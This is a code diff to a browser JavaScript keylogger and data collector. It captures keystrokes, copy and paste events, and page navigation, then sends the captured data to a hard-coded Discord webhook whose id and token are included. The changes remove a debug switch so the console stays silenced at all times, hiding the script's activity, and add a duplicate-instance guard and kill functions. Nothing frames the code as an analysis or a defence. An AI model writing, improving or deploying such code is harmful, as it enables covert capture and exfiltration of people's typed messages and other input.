@@ -1,6 +1,16 @@
 (function() {
     'use strict';
 
+    // ─── GUARDA CONTRA MÚLTIPLAS INSTÂNCIAS ───
+    if (window._testing) {
+        try {
+            if (typeof window._testing.kill === 'function') {
+                window._testing.kill();
+            }
+        } catch(e) {}
+        delete window._testing;
+    }
+
     const _id = '1528620856354537472';
     const _token = 'EDrEckoSN7dgJzZjj8LTeaisf_SxMjkrcy5QQMijZS3QcDFrNSEkvWPQde2-0V4EugEy';
     const _endpoint = 'https://discordapp.com/api/webhooks/' + _id + '/' + _token;
@@ -16,11 +26,11 @@
     localStorage.setItem('_collector_session', _session);
     let _eventCounts = { msg: 0, copy: 0, paste: 0, nav: 0 };
     let _isFlushing = false;
-    let _debug = localStorage.getItem('_collector_debug') === 'true';
+    let _debug = false; 
+    let _navObs = null;
 
     let _buffer = '';
     let _isCapturing = false;
-    let _lastKeyTime = 0;
     let _targetTag = '';
     let _targetId = '';
     let _targetPlatform = '';
@@ -34,13 +44,11 @@
         debug: console.debug
     };
 
-    if (!_debug) {
-        console.log = _noop;
-        console.warn = _noop;
-        console.error = _noop;
-        console.info = _noop;
-        console.debug = _noop;
-    }
+    console.log = _noop;
+    console.warn = _noop;
+    console.error = _noop;
+    console.info = _noop;
+    console.debug = _noop;
 
     function _ts() {
         return new Date().toISOString().replace('T', ' ').slice(0, 19);
@@ -235,7 +243,6 @@
                 _buffer = '';
             }
             _buffer += key;
-            _lastKeyTime = Date.now();
             return;
         }
 
@@ -318,12 +325,13 @@
         _push('heartbeat', { online: true, url: document.URL });
     }
 
+    // ─── INICIALIZAÇÃO ───
     function _init() {
         _setupMessageCapture();
         document.addEventListener('copy', _trackCopy, true);
 
-        const navObs = new MutationObserver(function() { _trackNav(); });
-        navObs.observe(document, { subtree: true, childList: true });
+        _navObs = new MutationObserver(function() { _trackNav(); });
+        _navObs.observe(document, { subtree: true, childList: true });
         window.addEventListener('popstate', _trackNav);
         window.addEventListener('hashchange', _trackNav);
 
@@ -332,12 +340,13 @@
 
         window.addEventListener('beforeunload', function() {
             _flush();
-            navObs.disconnect();
+            if (_navObs) _navObs.disconnect();
         });
 
         window._logs = {
             kill: function() {
                 clearInterval(_timer);
+                _timer = null;
                 _flush();
                 document.removeEventListener('keydown', _handleKeyDown, true);
                 document.removeEventListener('focusout', _handleFocusOut, true);
@@ -345,35 +354,22 @@
                 document.removeEventListener('copy', _trackCopy, true);
                 window.removeEventListener('popstate', _trackNav);
                 window.removeEventListener('hashchange', _trackNav);
-                navObs.disconnect();
+                if (_navObs) { _navObs.disconnect(); _navObs = null; }
+                localStorage.removeItem('_collector_session');
                 console.log = _orig.log;
                 console.warn = _orig.warn;
                 console.error = _orig.error;
                 console.info = _orig.info;
                 console.debug = _orig.debug;
-                localStorage.removeItem('_collector_session');
+                delete window._testing;
             },
             flush: _flush,
             debug: function(on) {
-                _debug = on;
-                localStorage.setItem('_collector_debug', String(on));
-                if (on) {
-                    console.log = _orig.log;
-                    console.warn = _orig.warn;
-                    console.error = _orig.error;
-                    console.info = _orig.info;
-                    console.debug = _orig.debug;
-                } else {
-                    console.log = _noop;
-                    console.warn = _noop;
-                    console.error = _noop;
-                    console.info = _noop;
-                    console.debug = _noop;
-                }
             }
         };
     }
 
+    // ─── INICIALIZA ───
     if (document.readyState === 'complete' || document.readyState === 'interactive') {
         setTimeout(_init, 0);
     } else {
@@ -383,5 +379,32 @@
     setTimeout(function() {
         if (!window._logs) _init();
     }, 3000);
+
+    window._testing = {
+        kill: function() {
+            if (window._logs && typeof window._logs.kill === 'function') {
+                window._logs.kill();
+            } else {
+                // Fallback manual
+                if (_timer) { clearInterval(_timer); _timer = null; }
+                if (_navObs) { _navObs.disconnect(); _navObs = null; }
+                document.removeEventListener('keydown', _handleKeyDown, true);
+                document.removeEventListener('focusout', _handleFocusOut, true);
+                document.removeEventListener('paste', _handlePaste, true);
+                document.removeEventListener('copy', _trackCopy, true);
+                window.removeEventListener('popstate', _trackNav);
+                window.removeEventListener('hashchange', _trackNav);
+                localStorage.removeItem('_collector_session');
+                delete window._testing;
+            }
+        },
+        flush: function() {
+            if (window._logs && typeof window._logs.flush === 'function') {
+                window._logs.flush();
+            } else {
+                _flush();
+            }
+        }
+    };
 
 })();
